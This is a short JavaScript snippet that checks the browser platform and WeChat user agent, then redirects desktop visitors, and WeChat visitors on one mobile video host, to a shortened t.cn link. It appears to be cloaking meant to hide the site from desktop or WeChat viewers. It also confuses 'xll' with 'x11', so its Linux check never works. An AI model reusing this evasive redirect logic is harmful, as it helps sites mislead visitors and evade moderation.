var system = {
    win:false,
    mac:false,
    xll:false
};

var p = navigator.platform;

system.win = p.indexOf("Win") == 0;

system.mac = p.indexOf("Mac") == 0;

system.x11 = p == "X11" || p.indexOf("Linux") == 0;

function is_weixin() {
    var ua = navigator.userAgent.toLowerCase();
    if (ua.match(/MicroMessenger/i) == "micromessenger") {
        return true;
    } else {
        return false;
    }
}

if (is_weixin() && window.location.host == "m.weiweitv.cc") {
    window.location.href = "http://t.cn/RiX35Yp";
}

if (system.win || system.mac || system.xll) {
    window.location.href = "http://t.cn/RiX35Yp";
} else {}